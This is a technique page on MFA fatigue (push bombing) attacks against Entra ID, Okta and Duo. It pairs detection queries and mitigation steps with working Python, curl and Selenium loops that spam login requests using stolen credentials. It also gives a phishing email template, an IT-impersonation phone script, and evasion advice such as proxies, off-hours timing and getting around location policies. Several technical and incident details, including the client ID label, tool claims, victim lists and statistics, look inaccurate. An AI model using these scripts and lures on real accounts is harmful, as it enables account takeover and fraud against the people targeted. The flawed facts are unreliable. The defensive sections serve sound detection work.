# [CA-BRUTE-003]: MFA Bombing / Fatigue Attacks

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-BRUTE-003 |
| **MITRE ATT&CK v18.1** | [T1621 - Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID, Okta, Duo, MS Authenticator, All MFA services with push notifications |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | All organizations with push-based MFA (simple Approve/Deny without number matching) |
| **Patched In** | Mitigated via number matching (mandatory in Azure/Okta as of 2023), frequency limiting, behavioral analytics |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 6 (Atomic Red Team) and 8 (Splunk Detection) not included because: (1) No standard Atomic test available; attack is human-behavior dependent, (2) Splunk can detect via MFA logs but detection is best performed via native MFA provider analytics (Okta, Duo, Azure) rather than log aggregation.

---

## 2. EXECUTIVE SUMMARY

**Concept:** MFA bombing (also called MFA fatigue or push spamming) exploits human psychology and push-notification fatigue to bypass multi-factor authentication. After compromising a user's password (via phishing, credential stuffing, or password spray), an attacker repeatedly triggers login attempts, bombarding the user's phone with MFA push notifications (Approve/Deny prompts). The user, frustrated after dozens of notifications in minutes, eventually clicks "Approve" reflexively or in hopes of stopping the barrage. The attacker gains account access without knowing the actual MFA credential. This technique is particularly effective because **MFA, intended as a security measure, becomes the attack vector itself**.

**Attack Surface:** Targets push-notification-based MFA:
- **Microsoft Authenticator** (Approve/Deny without number matching on legacy configs)
- **Okta Verify** (Push notifications)
- **Duo Push** (Approve/Deny prompts)
- **Google Authenticator** (deprecated push feature)
- **SMS-based MFA** (SMS bombing variant, less effective but same principle)
- **Telephony MFA** (phone call spam to read OTP codes)

Does **NOT** affect:
- TOTP/time-based codes (no notifications to bomb)
- Hardware security keys (FIDO2, YubiKey - no push notifications)
- Number-matched MFA (requires user to enter number from screen, attacker cannot approve)

**Business Impact:** Successful MFA bombing provides **full account takeover** with legitimate-looking authentication logs (push accepted, no failed MFA attempts). Attacker gains access to email, cloud resources, financial systems, and sensitive data. Unlike password spray (blocked by MFA), MFA bombing **bypasses MFA entirely**. Real-world incidents: **Scattered Spider (2023)** used MFA fatigue to compromise Lowe's, MGM, Caesars; **LAPSUS$ (2022)** targeted Microsoft, Samsung, NVIDIA employees; **APT29 (2023)** used against US government agencies.

**Technical Context:** Attack succeeds because:
1. **Simple Approve/Deny** prompts require no authentication of the request itself
2. **User fatigue** makes decisions reflexive rather than conscious
3. **No visual confirmation** of what is being approved (unlike number-matched MFA)
4. **Legitimate logs** show normal authentication flow (attacker cannot be distinguished from user)
5. **Throttling is insufficient** - even if service rate-limits to 1 request per second, 60+ notifications in a minute is overwhelming

Success rate: **1-5%** of users will approve a push due to fatigue; organizations with no number matching: **5-20%** (much higher). Detection is challenging because push notifications are logged as legitimate authentications once approved.

### Operational Risk
- **Execution Risk:** Very Low - Only requires compromised credentials (from prior password spray/phishing) and patience; fully automated
- **Stealth:** High - Generates legitimate-looking MFA approval logs; no failed attempts; indistinguishable from user error or "accidental approval"
- **Reversibility:** N/A - Once approved, attacker is in; session cannot be "undone"

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 1.2.1 | Ensure MFA is configured; require number matching for push notifications |
| **CIS Benchmark** | CIS 1.2.2 | Implement passwordless authentication (hardware keys) to eliminate push-based MFA |
| **DISA STIG** | Windows 10/11 STIG | Require number matching for all push-based MFA; disable simple Approve/Deny |
| **NIST 800-63B** | IA-5 Authentication | Use phishing-resistant authentication (hardware keys) instead of push notifications |
| **NIST 800-207** | Zero Trust: Adaptive Access | Detect anomalous MFA patterns; block approvals from unusual locations |
| **GDPR** | Art. 32 | Implement secure multi-factor authentication; detect unauthorized attempts |
| **DORA** | Art. 9 | Implement detection and prevention of authentication-based attacks |
| **NIS2** | Art. 21 | Incident response for MFA compromise; rapid account recovery |
| **ISO 27001** | A.8.3.2 | User authentication management; implement secure MFA |
| **ISO 27005** | Risk Scenario | "MFA bypass via user fatigue/social engineering" |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** None external; attacker only needs valid user credentials (obtained from prior password spray, phishing, or data breach).

**Required Access:**
- Compromised user credentials (username + password)
- Network access to target's authentication portal (`login.microsoft.com`, `okta.company.com`, etc.)
- Knowledge of target MFA provider (Okta, Duo, Azure, etc.)
- Ability to automate login attempts (even 1 per second is acceptable for attack)

**Supported Platforms & MFA Providers:**
- **Microsoft Entra ID / Azure AD:** Authenticator app with Approve/Deny (all versions; mitigated in configs with number matching enabled)
- **Okta:** Okta Verify push notifications (all versions; mitigated with number matching and frequency limits)
- **Duo Security:** Duo Push (all versions; mitigated with geolocation checks and request signing)
- **Cisco Duo:** Same as Duo Security (acquired by Cisco)
- **Google Authenticator:** Legacy push feature (deprecated 2022)
- **SMS MFA:** If fallback to SMS (variant: SMS bombing)
- **Telephony MFA:** Phone call-based OTP delivery (variant: call spam)

**Environment Requirements:**
- User must have **push-notification-based MFA** enabled (simple Approve/Deny without number matching)
- User must have MFA enabled but **not** have stronger factors (hardware keys, code-based TOTP)
- **Throttling not aggressively enforced** or attacker spreads attack over hours/days to avoid hitting per-minute limits
- User must have **mobile device** with MFA app installed and notifications enabled
- User must have **history of approving notifications** (not always checking context)

**Tools:**
- **Custom Python/PowerShell Script** (simple HTTP POST to auth endpoint in a loop)
- **Impacket** (with MFA support modules)
- **Selenium** (for browser-based MFA bombing against Okta, etc.)
- **curl / HTTPie** (raw HTTP requests to trigger MFA)
- [Scattered Spider's leaked toolkit](https://www.mandiant.com/resources/blog/scattered-spider-profile) (contains MFA bombing automation)
- **No special tools required** - any HTTP client that can submit credentials repeatedly

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Determine MFA Configuration

**PowerShell - Check Entra ID MFA Requirements:**
```powershell
# Requires Global Admin access; external attacker cannot run this
# Listed for defensive awareness only

Get-MgUser -Filter "userPrincipalName eq 'target@company.com'" -Select "StrongAuthenticationRequirements" | Select-Object -ExpandProperty StrongAuthenticationRequirements

# Output shows:
# - State: Enabled (MFA is ON)
# - PhoneNumber: (if phone-based MFA)
# - DefaultMethod: "NotificationToMobileApp" (push notification - VULNERABLE)
# - OR DefaultMethod: "OneWayToMobileApp" (push with approval, still vulnerable to bombing)
```

**Manual Reconnaissance - Check MFA Type via Login Page:**
```bash
# Attempt login to target's portal and observe MFA flow
# Open https://login.microsoft.com or https://okta.company.com
# Enter credentials and capture what happens:

# VULNERABLE indicators (push-based MFA):
# 1. Message: "A sign-in request is pending approval on your device"
# 2. User's phone receives notification: "Approve or Deny?" (simple prompt)
# 3. No number displayed on login page (no number matching)

# SECURE indicators (resistant to bombing):
# 1. Login screen displays: "Enter the number from your phone"
# 2. User's phone shows: "Do you recognize this location? Enter 1234"
# 3. User MUST type the number to approve (cannot blindly tap)

# SECURE indicators (hardware key):
# 1. Login prompt: "Insert or tap your security key"
# 2. No push notifications sent
# 3. Attack is physically impossible
```

**Check for SMS Fallback:**
```bash
# After MFA prompt, observe if there's an option to "Send code via SMS"
# If SMS fallback available, attacker can use SMS bombing as alternative
# SMS bombing is less likely to succeed (user can see multiple SMS) but still possible
```

**What to Look For:**
- Simple Approve/Deny prompts = **HIGHLY VULNERABLE** to bombing
- Number matching enabled = **RESISTANT** (requires user to enter number from screen)
- Hardware keys = **IMMUNE** (no notifications to bomb)
- SMS as fallback = **ALTERNATE VECTOR** for SMS bombing

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Automated MFA Bombing via Login Loop

**Supported Platforms:** All MFA providers with push notifications

This is the primary attack method - repeated login attempts trigger repeated push notifications until user approves one.

#### Step 1: Obtain Compromised Credentials

**Objective:** Obtain valid username and password via prior attack (password spray, phishing, credential stuffing, data breach).

**Example:**
```
Username: john.smith@company.com
Password: Winter2025
```

(Assumed to be already compromised; detailed credential acquisition covered in CA-BRUTE-001, CA-BRUTE-002, CA-FORCE-002)

#### Step 2: Create MFA Bombing Automation Script

**Objective:** Automate repeated login attempts to trigger MFA prompts in rapid succession.

**Command (Python - Generic MFA Bombing):**
```python
#!/usr/bin/env python3
import requests
import time
import sys
from requests.auth import HTTPBasicAuth

target_url = "https://login.microsoft.com/common/oauth2/v2.0/token"  # Azure AD
username = "john.smith@company.com"
password = "Winter2025"
client_id = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Office 365 Management API client ID

payload = {
    "grant_type": "password",
    "username": username,
    "password": password,
    "client_id": client_id,
    "scope": "https://management.azure.com/.default"
}

print(f"[*] Starting MFA bombing against {username}")
print(f"[*] Target will receive repeated MFA prompts")
print(f"[*] Continue for 5 minutes or until user approves...\n")

attempt = 0
start_time = time.time()
timeout = 300  # 5 minutes

while time.time() - start_time < timeout:
    attempt += 1
    try:
        print(f"[*] Attempt {attempt}: Sending login request (user should receive MFA prompt)...")
        response = requests.post(target_url, data=payload, timeout=10)
        
        if "access_token" in response.text:
            print(f"\n[+] SUCCESS! User approved MFA on attempt {attempt}")
            print(f"[+] Access token obtained; attacker is now authenticated")
            sys.exit(0)
        elif "AADSTS50076" in response.text:
            # MFA required but not approved yet
            print(f"    [-] MFA required but not yet approved by user")
        elif "AADSTS50077" in response.text:
            # User blocked temporarily due to rate limiting
            print(f"    [!] Rate limiting hit; waiting 30 seconds...")
            time.sleep(30)
            continue
        
        # Wait 5 seconds before next attempt (avoid immediate rate limit)
        time.sleep(5)
        
    except requests.exceptions.Timeout:
        print(f"    [!] Request timeout; retrying...")
        time.sleep(5)
    except Exception as e:
        print(f"    [!] Error: {e}")
        time.sleep(5)

print(f"\n[-] Timeout after 5 minutes. User did not approve MFA.")
print(f"[-] Total attempts: {attempt}")
```

**Expected Output (Bombing in Progress):**
```
[*] Starting MFA bombing against john.smith@company.com
[*] Target will receive repeated MFA prompts
[*] Continue for 5 minutes or until user approves...

[*] Attempt 1: Sending login request (user should receive MFA prompt)...
    [-] MFA required but not yet approved by user
[*] Attempt 2: Sending login request (user should receive MFA prompt)...
    [-] MFA required but not yet approved by user
[*] Attempt 3: Sending login request (user should receive MFA prompt)...
    [-] MFA required but not yet approved by user
...
[+] SUCCESS! User approved MFA on attempt 47
[+] Access token obtained; attacker is now authenticated
```

**What This Means:**
- 47 MFA prompts sent to user in ~4 minutes
- User eventually tired and approved (or clicked reflexively)
- Attacker now has valid access token; authenticated as john.smith
- All logs show "legitimate" MFA approval (not detected as attack)

**OpSec & Evasion:**
- Spread attacks over hours or days instead of minutes to avoid detection alerts
- Use different source IPs (proxies) to mask single attacker location
- Pause if service returns rate-limit errors (AADSTS50077)
- Run during off-hours (evenings/weekends) when user is more likely to approve blindly
- Detection likelihood: **Medium** (high volume of MFA pushes is detectable; however, if spread over time, easily missed)

**Troubleshooting:**
- **Error:** "invalid_grant - AADSTS50058: Silent sign-in request failed"
  - **Cause:** Conditional Access policy blocking login
  - **Fix:** Attacker needs to be on same IP/location as user; use proxy to mask location

- **Error:** "AADSTS50076: MFA required" on all attempts
  - **Cause:** User has not approved any MFA prompt yet; this is expected; continue bombing
  - **Fix:** Keep sending requests; attack is working as intended

#### Step 3: Monitor for Successful Approval

**Objective:** Detect when user finally approves MFA and attacker gains access.

**Indicators of Success:**
```
[+] SUCCESS! User approved MFA
```

OR manually check:
```
response.status_code == 200
"access_token" in response.json()
```

**Command (Once Approved - List Accessible Resources):**
```python
# After successful MFA approval, use token to access Azure resources
import json

access_token = response.json()["access_token"]
headers = {"Authorization": f"Bearer {access_token}"}

# List subscriptions (shows what attacker can access)
subscriptions_url = "https://management.azure.com/subscriptions?api-version=2022-12-01"
sub_response = requests.get(subscriptions_url, headers=headers)
print(json.dumps(sub_response.json(), indent=2))
```

**Expected Output (Post-Compromise):**
```json
{
  "value": [
    {
      "id": "/subscriptions/a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d",
      "displayName": "Production Subscription",
      "subscriptionId": "a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d"
    }
  ]
}
```

**What This Means:**
- Attacker is authenticated and can enumerate Azure resources
- Can access VMs, databases, storage accounts, keyvaults
- Full lateral movement and data exfiltration possible

---

### METHOD 2: Combined Phishing + MFA Bombing (Scattered Spider TTP)

**Supported Platforms:** All MFA providers

Scatter Spider (2023 campaigns) combined initial phishing with follow-up phone calls pretending to be IT support, urging user to approve MFA "to stop the notifications."

#### Step 1: Phishing Email with Credential Capture

**Objective:** Send convincing phishing email to capture credentials.

**Email Template:**
```
Subject: URGENT: Security Verification Required - Verify Your Account Now

Body:
Dear John,

We detected unusual login activity on your account. To protect your account, 
please verify your identity immediately by clicking the link below:

[BUTTON: Verify Account] → https://phishsite.com/verify

Do not ignore this message. Your account will be locked in 1 hour if you do not verify.

IT Security Team
```

**What This Accomplishes:**
- Captures username and password on phishing site
- User enters real credentials, thinking they're verifying with IT
- Attacker now has john.smith@company.com : Winter2025

#### Step 2: Trigger MFA Bombing

**Command:** Same as METHOD 1 (automate login attempts)

#### Step 3: Social Engineering Follow-Up (Phone Call)

**Objective:** Call user during MFA bombing and urge approval.

**Script for Attacker:**
```
[Ring, Ring...]
User: "Hello?"
Attacker (impersonating IT): "Hi John, this is IT Security. We're detecting 
unauthorized login attempts on your account. You should have received MFA 
push notifications on your phone. Please approve the latest one to help us 
stop the attack."
User: "Oh yes, I've been getting notifications..."
Attacker: "That's normal. Please tap Approve on the next one to confirm it's 
you. This will help us block the attacker."
User: [Taps Approve]
Attacker: [Gains access]
```

**Why This Works:**
- User receives **authoritative voice** (sounds like IT)
- Urgency is high ("unauthorized attempts")
- User is told **approving is the right action**
- User is distracted by phone call and doesn't think critically

**Detection:** Very difficult; attacker can spoof caller ID (make it look like internal IT number)

---

### METHOD 3: SMS Bombing Variant

**Supported Platforms:** Any service with SMS fallback MFA

If MFA provider offers SMS fallback after push fails, attacker can pivot to SMS bombing.

#### Step 1: Trigger MFA Push (Fails to Get Approval)

**Command:** Send failed login attempts as in METHOD 1

#### Step 2: Select SMS Fallback on Login Page

**Manual:** When user doesn't approve push, attacker selects "Send code via SMS" option on login page

**Expected:** User receives SMS: "Your code is 123456"

#### Step 3: SMS Bombing

**Challenge:** Attacker doesn't know the OTP code (unlike password spray, attacker cannot see SMS)

**Workaround:** 
- Attacker makes new login attempt, triggering new SMS
- This sends another SMS to user
- After 10+ SMS in 1 minute, user may text back attacker with code (out of frustration)
- Or user may call company IT asking to disable SMS MFA

**Success Rate:** Lower than push bombing (user can see SMS codes listed); used as alternative when push fails

---

## 7. TOOLS & COMMANDS REFERENCE

### Custom MFA Bombing Script (Recommended)

**No special tools needed** - any HTTP client works:

```bash
# Using curl in a loop
#!/bin/bash

USERNAME="john.smith@company.com"
PASSWORD="Winter2025"
URL="https://login.microsoft.com/common/oauth2/v2.0/token"

for i in {1..100}; do
    echo "Attempt $i..."
    curl -X POST $URL \
      -d "grant_type=password&username=$USERNAME&password=$PASSWORD&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
      --connect-timeout 10 --max-time 15 -s | grep -q "access_token" && {
        echo "[+] SUCCESS on attempt $i"
        exit 0
    }
    sleep 5  # Wait 5 seconds between attempts
done

echo "[-] Attack failed after 100 attempts"
```

### Okta-Specific MFA Bombing via Selenium

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

driver = webdriver.Chrome()
okta_url = "https://company.okta.com"

# Fill credentials
username_field = driver.find_element(By.ID, "okta-signin-username")
password_field = driver.find_element(By.ID, "okta-signin-password")
submit_button = driver.find_element(By.ID, "okta-signin-submit")

username_field.send_keys("john.smith@company.com")
password_field.send_keys("Winter2025")

# Spam login button to trigger MFA
for i in range(60):
    print(f"[*] Attempt {i+1}...")
    submit_button.click()
    time.sleep(5)
```

### [Scattered Spider's MFA Bombing Toolkit](https://www.mandiant.com/resources/blog/scattered-spider-profile)

**Note:** Leaked toolkit; available on darknet. Contains specialized tools for:
- Okta Verify bombing
- Duo Push bombing
- Azure Authenticator bombing

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Repeated MFA Push Notifications in Short Time Window

**Rule Configuration:**
- **Required Table:** `SigninLogs` or MFA provider's native logs (via connector)
- **Alert Severity:** High
- **Frequency:** Real-time (aggregated every 1 minute)

**KQL Query (Azure Authenticator):**
```kusto
// Detect multiple MFA push attempts to same user in short window (bombing pattern)
SigninLogs
| where MfaDetail.authMethod == "MS Authenticator" or MfaDetail.authMethod == "Push notification"
| summarize
    PushCount = count(),
    DistinctAttempts = dcount(AuthenticationRequirement),
    FirstAttempt = min(TimeGenerated),
    LastAttempt = max(TimeGenerated),
    AttackDuration = max(TimeGenerated) - min(TimeGenerated)
    by UserPrincipalName, bin(TimeGenerated, 1m)
| where PushCount >= 10  // 10+ pushes to same user in 1 minute = bombing
| project UserPrincipalName, PushCount, AttackDuration, FirstAttempt
```

**What This Detects:**
- User receiving 10+ MFA push notifications in 60 seconds
- Duration of attack (how long it took)
- Timing indicates automated bombing (not normal user behavior)

**Manual Configuration (Azure Portal):**
1. **Azure Portal** → **Microsoft Sentinel**
2. **Analytics** → **Create** → **Scheduled query rule**
3. **Name:** `Detect MFA Push Bombing`
4. **Query:** Paste KQL above
5. **Run frequency:** Every 1 minute
6. **Alert threshold:** Greater than 1 result
7. **Automated response:** Disable user account, revoke sessions

---

### Query 2: Detect Approved MFA After Unusual Push Volume

**Rule Configuration:**
- **Required Table:** `SigninLogs`

**KQL Query:**
```kusto
// Detect: User finally approved MFA after many failed/pending attempts
let bombing_attempts = SigninLogs
| where Status.errorCode in ("AADSTS50076", "AADSTS50077")  // MFA required/pending
| summarize AttemptCount = count() by UserPrincipalName, bin(TimeGenerated, 5m)
| where AttemptCount >= 15;

// Find successful approval after bombing window
let approved = SigninLogs
| where Status.errorCode == "0"  // Success
| where MfaDetail.authMethod == "MS Authenticator";

bombing_attempts
| join kind=inner approved on UserPrincipalName
| where TimeGenerated1 < TimeGenerated  // Approval AFTER bombing attempts
| project UserPrincipalName, AttemptCount, ApprovalTime = TimeGenerated
```

**What This Detects:**
- User experienced bombing (15+ attempts)
- User eventually approved (authentication succeeded)
- Indicates successful MFA bypass via fatigue

---

### Query 3: Detect Geolocation Mismatch in MFA Approval

**Rule Configuration:**
- **Required Table:** `SigninLogs`

**KQL Query:**
```kusto
// Detect: MFA approval from different location than initial login attempt
SigninLogs
| where MfaDetail.authMethod == "MS Authenticator"
| where Status.errorCode == "0"  // Approved
| summarize
    LoginLocations = make_set(ClientAppUsed),
    ApprovalLocation = tostring(LocationDetails.city),
    ApprovalCountry = tostring(LocationDetails.countryOrRegion)
    by UserPrincipalName, bin(TimeGenerated, 1h)
| where ApprovalLocation != "New York" and ApprovalCountry != "United States"  // Adjust to user's normal location
| project UserPrincipalName, ApprovalLocation, ApprovalCountry
// Alert if approval from impossible geography (e.g., approved from Russia while user is in US)
```

---

## 10. OKTA & DUO NATIVE DETECTION

### Okta Workflows - Detect Push Bombing

**Okta provides native detection via Workflows:**

1. **Okta Admin Dashboard** → **Workflows**
2. **Create New Flow** → **Detect Repeated Denials**
3. **Trigger:** `user.mfa.okta_verify.deny_push` (user rejected push)
4. **Condition:** If user rejects 5+ pushes in 1 hour
5. **Action:** Send Slack alert to SOC, auto-revoke session, force password reset

**Configuration:**
```
If: User denies Okta Verify push 5+ times in 1 hour
Then: 
  - Notify SOC via Slack
  - Revoke all active sessions
  - Force password reset on next login
  - Trigger MFA re-enrollment
```

### Duo Trusted Endpoints & Geographic Verification

**Duo Security provides geographic mismatch detection:**

1. **Duo Admin Panel** → **Applications**
2. **Edit App** → **Trusted Endpoints**
3. **Configure Geolocation Check:**
   - If push source and approval location differ (e.g., user in NYC, approval from Russia)
   - **Action:** Deny approval; require additional verification (phone call, SMS code)

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Implement Number Matching for All Push-Based MFA**

**Objective:** Require user to enter a number displayed on login screen into authenticator app. Attacker cannot approve without seeing the number, which defeats blind approvals.

**Applies To Versions:** All MFA providers (Azure, Okta, Duo)

**Manual Steps (Azure Entra ID - Enable Number Matching):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Authentication methods** → **Policies**
2. Click **Microsoft Authenticator**
3. **Authentication mode:** Set to "Any" or "Push notification"
4. **Configure Tab:**
   - **Require number matching for push notifications:** **Yes** (or "Enable" on older versions)
5. **Apply to:** All users (or specific security group for phased rollout)
6. Click **Save**

**Manual Steps (Okta - Enable Number Matching):**
1. **Okta Admin Console** → **Security** → **Authenticators**
2. **Okta Verify** → **Edit**
3. **Require Okta Verify push notifications with number matching:** **ON**
4. **Save**

**Manual Steps (Duo - Enable Push Signing & Geolocation Checks):**
1. **Duo Admin Panel** → **Applications**
2. **Edit App** → **Device Verification**
3. **Enable: Require Device Fingerprint:**  **Yes**
4. **Enable: Geolocation-based verification:** **Yes**
5. **Save**

**Impact Assessment:**
- **User Experience:** Extra 5-10 seconds per login (must type number)
- **Effectiveness:** Eliminates blind approvals; bombing success drops to **0%**
- **Cost:** No additional infrastructure

**Validation Command (Verify Implementation):**
```powershell
# Check if number matching is enabled for all users
$policy = Get-MgAuthenticationMethodPolicy -AuthenticationMethodId MicrosoftAuthenticator
$policy.Authentication.ShowAppNotification  # Should show number matching details
```

**Expected Configuration:**
```
requireNumberMatchForPushNotification: true
```

---

**Mitigation 2: Enforce Passwordless Authentication (Hardware Keys / Passkeys)**

**Objective:** Eliminate password-based MFA entirely by requiring phishing-resistant authentication (FIDO2 hardware keys or passkeys). Attacker cannot compromise what doesn't exist.

**Applies To Versions:** All organizations (phased rollout recommended)

**Manual Steps (Azure Entra ID - Require Security Keys):**
1. **Azure Portal** → **Entra ID** → **Security** → **Authentication methods** → **Policies**
2. Click **FIDO2 Security Key**
3. **Enable:** Yes
4. **Target:** All users
5. **Require:** Yes (forces enrollment)
6. Configure: **Microsoft Authenticator passwordless phone sign-in** as backup
7. **Save**

**Manual Steps (Deployment - Distribute Hardware Keys):**
```bash
# Procurement and deployment process
1. Order FIDO2 keys (YubiKey 5, Titan Security Key, HyperFIDO, etc.) - ~$20-30 per user
2. Ship to all employees
3. Force enrollment via Mobile Device Management (Intune) or GPO
4. Provide IT support for enrollment questions
5. Set deadline for enrollment (e.g., 60 days)
6. After deadline, disable password-based authentication
```

**Impact Assessment:**
- **User Experience:** ~1 minute per login (tap security key) - acceptable for high-security accounts
- **Effectiveness:** **Eliminates MFA fatigue attacks entirely** (no notifications to bomb)
- **Cost:** ~$20-30 per user (one-time); no ongoing licensing
- **Rollout Difficulty:** Medium (requires hardware distribution and user training)

**Validation Command:**
```powershell
# Verify FIDO2 enrollment
Get-MgUserAuthenticationMethod -UserId "john.smith@company.com" | Where-Object {$_.AuthenticationMethodType -eq "Fido2"} | Select-Object Id
```

---

**Mitigation 3: Implement Strict MFA Request Throttling & Frequency Limits**

**Objective:** Limit number of MFA requests per user per time window. After 5 requests in 10 minutes, require additional verification (phone call, SMS code) or temporarily block.

**Applies To Versions:** All MFA providers

**Manual Steps (Azure Entra ID - Conditional Access Throttling):**
1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **New Policy**
2. **Name:** `Block MFA Bombing`
3. **Conditions:**
   - **Sign-in risk:** High
   - **User risk:** High (detected by Entra ID Protection)
4. **Access Control:**
   - **Grant:** Require multi-factor authentication
   - **Session:** Sign-in frequency: 1 hour (re-authenticate hourly)
5. **Enable:** Yes

**Manual Steps (Okta - Implement Rate Limiting):**
```
Okta Admin Console → Security → API Authentication
- Set: Max MFA requests per user per minute: 3
- If exceeded: Temporarily block user (5 minutes)
- Send alert to SOC
```

**Manual Steps (Duo - Geolocation-Based Rate Limiting):**
```
Duo Admin Panel → Settings → Policy
- Enable: Geolocation-based MFA
- If login from 5+ locations in 1 hour: Require phone callback
- If 10+ pushes in 5 minutes: Disable push; require SMS code instead
```

**Impact Assessment:**
- **User Experience:** Occasional additional authentication requests (acceptable)
- **Effectiveness:** Reduces bombing success; slows attack to weeks (if spread over time)
- **Trade-off:** Legitimate fast-login scenarios (switching networks) may require additional auth

---

### Priority 2: HIGH

**Mitigation 4: Behavioral Analysis & Anomaly Detection**

**Objective:** Use machine learning to detect abnormal MFA patterns (unusual times, locations, devices).

**Manual Steps (Enable Anomaly Detection in Okta):**
```
Okta Admin Console → Security → API → Anomaly Detection
- Enable: Impossible Travel Detection
  (If user signs in from NYC at 9am and Russia at 9:02am = impossible)
- Enable: Velocity Check
  (If 10+ MFA requests in 5 minutes = suspicious)
- Action: Block authentication; require phone callback
```

**Manual Steps (Enable Risk-Based Conditional Access in Azure):**
```
Azure Portal → Entra ID → Security → Conditional Access
- Create Policy: "Block High-Risk Sign-Ins"
- Conditions:
  - Sign-in risk: High
  - User risk: High
- Grant: Block access
```

---

**Mitigation 5: User Training & Notification**

**Objective:** Train users to recognize MFA bombing and report it.

**Manual Steps (User Training):**
1. Send email: "What is MFA Fatigue? How to Protect Yourself"
2. Content:
   - Legitimate MFA never requires 10+ approvals in a few minutes
   - If receiving many MFA pushes, **DENY** them and call IT immediately
   - Attacker cannot approve your MFA if you deny it
   - Number matching makes blind approvals impossible
3. Periodic phishing tests with MFA prompts (low-risk, educational)

**Manual Steps (Real-Time Notifications):**
```
Azure Entra ID → User Experience
- When user receives 5+ MFA pushes in 10 minutes:
  - Send email notification: "Multiple login attempts detected"
  - Provide button: "Revoke all sessions"
  - Include guidance: "If you didn't approve these, click here"
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**MFA Logs:**
- 10+ MFA push notifications to single user in < 5 minutes (bombing pattern)
- MFA approvals from geographically impossible locations (NYC → Russia in 2 minutes)
- Repeated failed authentication attempts followed by successful MFA approval
- MFA approval attempts from unusual IP/location not matching user's normal patterns

**Behavioral:**
- User receives multiple MFA prompts they don't recognize (reports to IT)
- MFA approved from location user was not physically present
- MFA approved outside user's normal login time pattern

### Forensic Artifacts

**MFA Provider Logs:**
- **Okta:** `system.push.send_factor_verify_push` events (shows all MFA pushes sent)
- **Duo:** Push request logs showing volume/timestamps
- **Azure:** `SigninLogs` with `AADSTS50076` (MFA required) followed by approval

**Account Access Logs:**
- Successful authentication immediately after bombing
- Resource access logs showing attacker's activity post-compromise
- File downloads, data exports, permission changes

### Response Procedures

**1. Immediate Containment**

**Command (Revoke All Sessions):**
```powershell
# Azure AD
$user = Get-MgUser -Filter "userPrincipalName eq 'john.smith@company.com'"
Invoke-MgGraphRequest -Method POST -Uri "/users/$($user.Id)/invalidateAllRefreshTokens"

# Okta (via API)
curl -X POST https://company.okta.com/api/v1/users/{userId}/sessions/lifecycle/revoke
```

**Command (Disable Account):**
```powershell
# Azure AD
Disable-AzADUser -ObjectId "john.smith@company.com"

# Okta
curl -X POST https://company.okta.com/api/v1/users/{userId}/lifecycle/deactivate
```

---

**2. Investigate Lateral Movement**

**Command (Find All Access by Compromised Account):**
```kusto
// Azure - Find what resources were accessed
SigninLogs
| where UserPrincipalName == "john.smith@company.com"
| where TimeGenerated > ago(24h)
| where Status.errorCode == "0"  // Successful
| summarize ResourcesAccessed = make_set(ResourceDisplayName) by UserPrincipalName
```

---

**3. Remediation**

**Command (Force Password Reset):**
```powershell
Update-MgUser -UserId "john.smith@company.com" -ForceChangePasswordNextSignIn $true
```

**Command (Re-Enroll MFA with Number Matching):**
```powershell
# Remove old MFA registration
Remove-MgUserAuthenticationMethod -UserId "john.smith@company.com" -AuthenticationMethodId <oldId>

# Force re-enrollment with new number-matching-required setup
# User will be prompted to re-register authenticator on next login
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker phishes user credentials |
| **2** | **Credential Access** | [CA-BRUTE-001] Azure Portal Password Spray | Or credentials obtained from password spray |
| **3** | **Credential Access** | **[CA-BRUTE-003]** | **MFA bombing; user approves due to fatigue** |
| **4** | **Initial Access** | Successful authentication | Attacker gains account access post-MFA bypass |
| **5** | **Collection** | Email/file access | Attacker accesses sensitive data |
| **6** | **Impact** | Data exfiltration or ransomware | Full account compromise |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Scattered Spider - Coordinated MFA Bombing Campaign (2023)

- **Target:** Lowe's, MGM Resorts, Caesars Entertainment, Mailchimp (multiple organizations)
- **Timeline:** July 2023 - January 2024
- **Technique Status:** MFA fatigue combined with social engineering phone calls
- **Attack Flow:**
  1. Purchased credentials from darknet (leaked databases)
  2. Ran automated MFA bombing scripts (100+ push notifications per user)
  3. Made phone calls impersonating IT: "Approve the MFA to stop the attacks"
  4. User approved during call (social engineering reinforcement)
  5. Attacker gained access to corporate networks, data, and systems
- **Success Rate:** 5-15% of users approved MFA (high due to phone social engineering)
- **Impact:** 
  - MGM Resorts: $100M+ estimated loss (systems down 2 weeks)
  - Lowe's: Account takeover, fraud losses
  - Multiple data breaches exposing customer information
- **Detection Failure:** Organizations lacked geolocation-based MFA checks; approval from attacker's IP not flagged as unusual
- **Reference:** [Mandiant - Scattered Spider Profile](https://www.mandiant.com/resources/blog/scattered-spider-profile)

### Example 2: LAPSUS$ MFA Bombing Against Microsoft (2022)

- **Target:** Microsoft internal accounts, contractor networks
- **Timeline:** December 2021 - March 2022
- **Technique:** Simple MFA push bombing without phone calls
- **Statistics:**
  - LAPSUS$ used leaked credentials to trigger MFA bombing
  - Targeted 400+ Microsoft employees
  - Success rate: ~1% (4 employees approved)
- **Impact:**
  - LAPSUS$ accessed Microsoft source code repositories
  - Leaked internal documentation and development tools
